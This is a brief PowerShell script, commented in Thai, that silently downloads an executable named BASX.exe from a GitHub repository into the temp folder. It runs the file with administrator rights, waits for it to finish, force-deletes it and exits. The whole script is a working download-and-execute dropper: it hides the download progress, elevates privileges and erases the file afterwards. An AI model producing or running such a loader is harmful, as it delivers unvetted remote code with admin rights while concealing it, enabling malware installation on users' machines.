# 1. ตั้งค่าเบื้องหลัง
$url = "https://github.com/relaxwtf777-lang/cmd/raw/refs/heads/main/BASX.exe"
$output = "$env:TEMP\BASX.exe"

# 2. ดาวน์โหลดไฟล์แบบเงียบๆ (ไม่ให้มีแถบโหลดขึ้น)
$ProgressPreference = 'SilentlyContinue'
Invoke-WebRequest -Uri $url -OutFile $output

# 3. สั่งรันแบบ Admin และ "รอ" จนกว่าโปรแกรมจะปิด
# -Wait คือหัวใจสำคัญ: มันจะรอจนกว่า BASX.exe ของบาสจะดับ
Start-Process -FilePath $output -Verb RunAs -Wait

# 4. พอดับปุ๊บ สั่งลบไฟล์ทิ้งทันที
if (Test-Path $output) {
    Remove-Item -Path $output -Force
}

# 5. ปิด PowerShell ตัวเองทันที
exit
